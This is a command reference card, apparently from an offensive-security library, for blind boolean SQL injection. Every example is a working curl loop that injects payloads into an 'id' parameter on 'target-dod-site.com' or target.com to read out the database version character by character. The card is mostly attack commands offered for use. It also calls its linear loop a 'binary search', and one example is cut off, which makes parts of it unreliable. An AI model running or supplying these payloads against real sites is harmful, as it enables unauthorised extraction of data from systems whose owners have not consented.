---
id: cmd-uuid-3
name: curl-boolean-extract
type: command
executor: bash
data: >-
  for i in {32..126}; do curl "https://target-dod-site.com/page?id=1' AND
  ASCII(SUBSTRING((SELECT @@version),1,1))=$i--"; done
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:15.102Z'
platforms:
  - Linux
  - macOS
tags:
  - sqli
  - extraction
verified: false
validated: true
submitted: true
---

# curl-boolean-extract

## Command

```bash
for i in {32..126}; do curl "https://target-dod-site.com/page?id=1' AND ASCII(SUBSTRING((SELECT @@version),1,1))=$i--"; done
```

## Description

Iteratively extracts data using boolean conditions on ASCII values for blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ASCII(SUBSTRING(...))=$i` | Binary search payload | Yes |
| `{32..126}` | ASCII range loop | Yes |

## Examples

### Basic Usage

```bash
for i in {65..90}; do curl "https://target.com?id=1' AND SUBSTRING(db,1,1)=CHAR($i)--"; done
```

### Advanced Usage

```bash
for pos in 1 2 3; do for i in {32..126}; do curl ...; done; done
```

## Expected Output

True responses indicate matching characters; script to log hits.

## Related

- [[Related Procedure]]
